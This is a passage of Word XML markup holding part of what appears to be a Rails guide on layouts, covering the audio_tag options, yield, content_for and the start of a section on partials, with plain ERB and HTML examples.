    <w:p w14:paraId="1E2F6888" w14:textId="77777777" w:rsidR="00AC12D4" w:rsidRDefault="00AC12D4" w:rsidP="00AC12D4">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t>You can supply a path to the audio file if you like:</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblCellSpacing w:w="0" w:type="dxa"/>
        <w:tblCellMar>
          <w:left w:w="0" w:type="dxa"/>
          <w:right w:w="0" w:type="dxa"/>
        </w:tblCellMar>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="4535"/>
      </w:tblGrid>
      <w:tr w:rsidR="00AC12D4" w14:paraId="2A93171F" w14:textId="77777777" w:rsidTr="00AC12D4">
        <w:trPr>
          <w:tblCellSpacing w:w="0" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="1BC9DF95" w14:textId="77777777" w:rsidR="00AC12D4" w:rsidRDefault="00AC12D4">
            <w:pPr>
              <w:divId w:val="1112288344"/>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>&lt;%=</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>audio_tag "music/first_song.mp3"</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>%&gt;</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="67EAB862" w14:textId="77777777" w:rsidR="00AC12D4" w:rsidRDefault="00AC12D4" w:rsidP="00AC12D4">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">You can also supply a hash of additional options, such as </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>:id</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">, </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>:class</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> etc.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="32B06351" w14:textId="77777777" w:rsidR="00AC12D4" w:rsidRDefault="00AC12D4" w:rsidP="00AC12D4">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">Like the </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>video_tag</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">, the </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>audio_tag</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> has special options:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="33DEDA7E" w14:textId="77777777" w:rsidR="00AC12D4" w:rsidRDefault="00AC12D4" w:rsidP="00AC12D4">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="74"/>
        </w:numPr>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>:autoplay =&gt; true</w:t>
      </w:r>
      <w:r>
        <w:t>, starts playing the audio on page load</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0770D2DE" w14:textId="77777777" w:rsidR="00AC12D4" w:rsidRDefault="00AC12D4" w:rsidP="00AC12D4">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="74"/>
        </w:numPr>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>:controls =&gt; true</w:t>
      </w:r>
      <w:r>
        <w:t>, provides browser supplied controls for the user to interact with the audio.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0E563FE1" w14:textId="77777777" w:rsidR="00AC12D4" w:rsidRDefault="00AC12D4" w:rsidP="00AC12D4">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="74"/>
        </w:numPr>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>:autobuffer =&gt; true</w:t>
      </w:r>
      <w:r>
        <w:t>, the audio will pre load the file for the user on page load.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1DDD5B2E" w14:textId="77777777" w:rsidR="00AC12D4" w:rsidRDefault="00AC12D4" w:rsidP="00AC12D4">
      <w:pPr>
        <w:pStyle w:val="4"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">3.2 Understanding </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>yield</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4FFFAF47" w14:textId="77777777" w:rsidR="00AC12D4" w:rsidRDefault="00AC12D4" w:rsidP="00AC12D4">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">Within the context of a layout, </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>yield</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> identifies a section where content from the view should be inserted. The simplest way to use this is to have a single </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>yield</w:t>
      </w:r>
      <w:r>
        <w:t>, into which the entire contents of the view currently being rendered is inserted:</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblCellSpacing w:w="0" w:type="dxa"/>
        <w:tblCellMar>
          <w:left w:w="0" w:type="dxa"/>
          <w:right w:w="0" w:type="dxa"/>
        </w:tblCellMar>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="1775"/>
      </w:tblGrid>
      <w:tr w:rsidR="00AC12D4" w14:paraId="29C45BC7" w14:textId="77777777" w:rsidTr="00AC12D4">
        <w:trPr>
          <w:tblCellSpacing w:w="0" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="1EF42025" w14:textId="77777777" w:rsidR="00AC12D4" w:rsidRDefault="00AC12D4" w:rsidP="00AC12D4">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>&lt;html&gt;</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="1681EDC1" w14:textId="77777777" w:rsidR="00AC12D4" w:rsidRDefault="00AC12D4" w:rsidP="00AC12D4">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>  &lt;head&gt;</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="118AD571" w14:textId="77777777" w:rsidR="00AC12D4" w:rsidRDefault="00AC12D4" w:rsidP="00AC12D4">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>  &lt;/head&gt;</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="162AF8BD" w14:textId="77777777" w:rsidR="00AC12D4" w:rsidRDefault="00AC12D4" w:rsidP="00AC12D4">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>  &lt;body&gt;</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="09953657" w14:textId="77777777" w:rsidR="00AC12D4" w:rsidRDefault="00AC12D4" w:rsidP="00AC12D4">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>  &lt;%=</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>yield</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>%&gt;</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="3C526C9D" w14:textId="77777777" w:rsidR="00AC12D4" w:rsidRDefault="00AC12D4" w:rsidP="00AC12D4">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>  &lt;/body&gt;</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="411DA80A" w14:textId="77777777" w:rsidR="00AC12D4" w:rsidRDefault="00AC12D4" w:rsidP="00AC12D4">
            <w:pPr>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>&lt;/html&gt;</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="6D01BA75" w14:textId="77777777" w:rsidR="00AC12D4" w:rsidRDefault="00AC12D4" w:rsidP="00AC12D4">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t>You can also create a layout with multiple yielding regions:</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblCellSpacing w:w="0" w:type="dxa"/>
        <w:tblCellMar>
          <w:left w:w="0" w:type="dxa"/>
          <w:right w:w="0" w:type="dxa"/>
        </w:tblCellMar>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="2423"/>
      </w:tblGrid>
      <w:tr w:rsidR="00AC12D4" w14:paraId="68732114" w14:textId="77777777" w:rsidTr="00AC12D4">
        <w:trPr>
          <w:tblCellSpacing w:w="0" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="765AFA2F" w14:textId="77777777" w:rsidR="00AC12D4" w:rsidRDefault="00AC12D4" w:rsidP="00AC12D4">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>&lt;html&gt;</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="1B3CDBA1" w14:textId="77777777" w:rsidR="00AC12D4" w:rsidRDefault="00AC12D4" w:rsidP="00AC12D4">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>  &lt;head&gt;</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="08C28163" w14:textId="77777777" w:rsidR="00AC12D4" w:rsidRDefault="00AC12D4" w:rsidP="00AC12D4">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>  &lt;%=</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>yield</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>:head</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>%&gt;</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="28EA7AE6" w14:textId="77777777" w:rsidR="00AC12D4" w:rsidRDefault="00AC12D4" w:rsidP="00AC12D4">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>  &lt;/head&gt;</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="46798B6B" w14:textId="77777777" w:rsidR="00AC12D4" w:rsidRDefault="00AC12D4" w:rsidP="00AC12D4">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>  &lt;body&gt;</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="3FE654BF" w14:textId="77777777" w:rsidR="00AC12D4" w:rsidRDefault="00AC12D4" w:rsidP="00AC12D4">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>  &lt;%=</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>yield</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>%&gt;</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="024E0B2B" w14:textId="77777777" w:rsidR="00AC12D4" w:rsidRDefault="00AC12D4" w:rsidP="00AC12D4">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>  &lt;/body&gt;</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="070F13B1" w14:textId="77777777" w:rsidR="00AC12D4" w:rsidRDefault="00AC12D4" w:rsidP="00AC12D4">
            <w:pPr>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>&lt;/html&gt;</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="23C8DA71" w14:textId="77777777" w:rsidR="00AC12D4" w:rsidRDefault="00AC12D4" w:rsidP="00AC12D4">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">The main body of the view will always render into the unnamed </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>yield</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">. To render content into a named </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>yield</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">, you use the </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>content_for</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> method.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6B70F7F7" w14:textId="77777777" w:rsidR="00AC12D4" w:rsidRDefault="00AC12D4" w:rsidP="00AC12D4">
      <w:pPr>
        <w:pStyle w:val="4"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">3.3 Using the </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>content_for</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> Method</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="67E5B38B" w14:textId="77777777" w:rsidR="00AC12D4" w:rsidRDefault="00AC12D4" w:rsidP="00AC12D4">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">The </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>content_for</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> method allows you to insert content into a named </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>yield</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> block in your layout. For example, this view would work with the layout that you just saw:</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblCellSpacing w:w="0" w:type="dxa"/>
        <w:tblCellMar>
          <w:left w:w="0" w:type="dxa"/>
          <w:right w:w="0" w:type="dxa"/>
        </w:tblCellMar>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="3840"/>
      </w:tblGrid>
      <w:tr w:rsidR="00AC12D4" w14:paraId="5D3CA96B" w14:textId="77777777" w:rsidTr="00AC12D4">
        <w:trPr>
          <w:tblCellSpacing w:w="0" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="7225BC3A" w14:textId="77777777" w:rsidR="00AC12D4" w:rsidRDefault="00AC12D4" w:rsidP="00AC12D4">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>&lt;%</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>content_for :head</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>do</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>%&gt;</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="2CB2EA04" w14:textId="77777777" w:rsidR="00AC12D4" w:rsidRDefault="00AC12D4" w:rsidP="00AC12D4">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>  &lt;title&gt;A simple page&lt;/title&gt;</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="66C8797C" w14:textId="77777777" w:rsidR="00AC12D4" w:rsidRDefault="00AC12D4" w:rsidP="00AC12D4">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>&lt;%</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>end</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>%&gt;</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="33E988AD" w14:textId="77777777" w:rsidR="00AC12D4" w:rsidRDefault="00AC12D4" w:rsidP="00AC12D4">
            <w:r>
              <w:t> </w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="212D2DA4" w14:textId="77777777" w:rsidR="00AC12D4" w:rsidRDefault="00AC12D4" w:rsidP="00AC12D4">
            <w:pPr>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>&lt;p&gt;Hello, Rails!&lt;/p&gt;</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="7B3C5A97" w14:textId="77777777" w:rsidR="00AC12D4" w:rsidRDefault="00AC12D4" w:rsidP="00AC12D4">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">The result of rendering this page into the supplied layout would be this </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="caps"/>
        </w:rPr>
        <w:t>HTML</w:t>
      </w:r>
      <w:r>
        <w:t>:</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblCellSpacing w:w="0" w:type="dxa"/>
        <w:tblCellMar>
          <w:left w:w="0" w:type="dxa"/>
          <w:right w:w="0" w:type="dxa"/>
        </w:tblCellMar>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="3840"/>
      </w:tblGrid>
      <w:tr w:rsidR="00AC12D4" w14:paraId="59367415" w14:textId="77777777" w:rsidTr="00AC12D4">
        <w:trPr>
          <w:tblCellSpacing w:w="0" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="556C4233" w14:textId="77777777" w:rsidR="00AC12D4" w:rsidRDefault="00AC12D4" w:rsidP="00AC12D4">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>&lt;html&gt;</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="3534755F" w14:textId="77777777" w:rsidR="00AC12D4" w:rsidRDefault="00AC12D4" w:rsidP="00AC12D4">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>  &lt;head&gt;</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="388784FE" w14:textId="77777777" w:rsidR="00AC12D4" w:rsidRDefault="00AC12D4" w:rsidP="00AC12D4">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>  &lt;title&gt;A simple page&lt;/title&gt;</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="4205E90D" w14:textId="77777777" w:rsidR="00AC12D4" w:rsidRDefault="00AC12D4" w:rsidP="00AC12D4">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>  &lt;/head&gt;</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="77CA7D53" w14:textId="77777777" w:rsidR="00AC12D4" w:rsidRDefault="00AC12D4" w:rsidP="00AC12D4">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>  &lt;body&gt;</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="2E36BEAE" w14:textId="77777777" w:rsidR="00AC12D4" w:rsidRDefault="00AC12D4" w:rsidP="00AC12D4">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>  &lt;p&gt;Hello, Rails!&lt;/p&gt;</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="053DF7D9" w14:textId="77777777" w:rsidR="00AC12D4" w:rsidRDefault="00AC12D4" w:rsidP="00AC12D4">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>  &lt;/body&gt;</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="355A031E" w14:textId="77777777" w:rsidR="00AC12D4" w:rsidRDefault="00AC12D4" w:rsidP="00AC12D4">
            <w:pPr>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>&lt;/html&gt;</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="19102FD5" w14:textId="77777777" w:rsidR="00AC12D4" w:rsidRDefault="00AC12D4" w:rsidP="00AC12D4">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">The </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>content_for</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> method is very helpful when your layout contains distinct regions such as sidebars and footers that should get their own blocks of content inserted. It’s also useful for inserting tags that load page-specific JavaScript or css files into the header of an otherwise generic layout.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1D07CEEE" w14:textId="77777777" w:rsidR="00AC12D4" w:rsidRDefault="00AC12D4" w:rsidP="00AC12D4">
      <w:pPr>
        <w:pStyle w:val="4"/>
      </w:pPr>
      <w:r>
        <w:t>3.4 Using Partials</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4F9A3E0D" w14:textId="77777777" w:rsidR="00AC12D4" w:rsidRDefault="00AC12D4" w:rsidP="00AC12D4">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t>Partial templates – usually just called “partials” – are another device for breaking the rendering process into more manageable chunks. With a partial, you can move the code for rendering a particular piece of a response to its own file.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6B4B5E66" w14:textId="77777777" w:rsidR="00AC12D4" w:rsidRDefault="00AC12D4" w:rsidP="00AC12D4">
      <w:pPr>
        <w:pStyle w:val="5"/>
      </w:pPr>
      <w:r>
        <w:t>3.4.1 Naming Partials</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="45715B8D" w14:textId="77777777" w:rsidR="00AC12D4" w:rsidRDefault="00AC12D4" w:rsidP="00AC12D4">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">To render a partial as part of a view, you use the </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>render</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> method within the view:</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblCellSpacing w:w="0" w:type="dxa"/>
        <w:tblCellMar>
          <w:left w:w="0" w:type="dxa"/>
          <w:right w:w="0" w:type="dxa"/>
        </w:tblCellMar>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="2328"/>
      </w:tblGrid>
      <w:tr w:rsidR="00AC12D4" w14:paraId="1CEFD874" w14:textId="77777777" w:rsidTr="00AC12D4">
        <w:trPr>
          <w:tblCellSpacing w:w="0" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="28D20AAA" w14:textId="77777777" w:rsidR="00AC12D4" w:rsidRDefault="00AC12D4">
            <w:pPr>
              <w:divId w:val="812723390"/>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>&lt;%= render "menu"</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>%&gt;</w:t>
            </w:r>
          </w:p>
